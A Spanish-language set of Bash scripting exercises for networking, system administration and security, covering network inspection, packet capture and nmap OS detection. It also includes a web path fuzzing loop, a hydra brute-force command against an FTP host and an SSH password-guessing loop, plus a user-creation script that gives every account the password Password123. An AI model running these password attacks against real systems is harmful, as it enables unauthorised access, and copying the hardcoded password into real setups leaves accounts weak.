
# 🧪 Ejercicios Prácticos con Bash Scripting

Esta sección contiene una colección de ejercicios reales aplicables a entornos de red, ciberseguridad, administración de sistemas y automatización. Son ideales para afianzar conocimientos previos adquiridos en el curso.

---

## 📢 Comando echo en Detalle

```bash
echo -e "Hola\nMundo"
echo -e "\033[1;32m¡Correcto!\033[0m"
```

---

## 🛡️ Bash Scripting Aplicado a Ciberseguridad - Fuzzing Web

```bash
#!/bin/bash
for i in $(cat wordlist.txt); do
  curl -s -o /dev/null -w "%{http_code} - $i\n" "http://target.com/$i"
done
```

---

## 🌐 Análisis de Red con Bash (Partes 1 a 3)

```bash
ip a
ip r
netstat -tulnp
ss -an
```

Scripts para analizar:
- Interfaces activas
- Rutas
- Puertos abiertos
- Conexiones activas

---

## 🧰 Análisis de Red con TCPdump y Wireshark

```bash
sudo tcpdump -i eth0 -nn port 80
```

Combinado con `tshark` para exportar tráfico:
```bash
tshark -i eth0 -w captura.pcap
```

---

## 🧹 Script para Eliminar Archivos Duplicados

```bash
find . -type f -exec md5sum {} + | sort | uniq -w32 -dD
```

---

## 🧠 Detector de Sistemas Operativos (Parte 1 y 2)

Script de fingerprint básico:

```bash
nmap -O 192.168.1.1
```

---

## 👥 Automatización de Usuarios en Linux

```bash
#!/bin/bash
for user in user1 user2 user3; do
  useradd -m "$user"
  echo "$user:Password123" | chpasswd
done
```

---

## 🔐 Herramientas para Cracking de Contraseñas

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.10
```

---

## ⚙️ Automatización de Cracking (solo fines educativos)

```bash
#!/bin/bash
for pass in $(cat pass.txt); do
  echo "Intentando $pass"
  sshpass -p "$pass" ssh usuario@192.168.1.10
done
```

⚠️ **Nota**: Este tipo de script solo debe usarse en laboratorios controlados.

---

## ✅ Recomendaciones

- Usa estos ejemplos para construir tus propios proyectos.
- Aplica seguridad en tus scripts: permisos, autenticación, cifrado.
- ¡Experimenta y automatiza tareas reales!

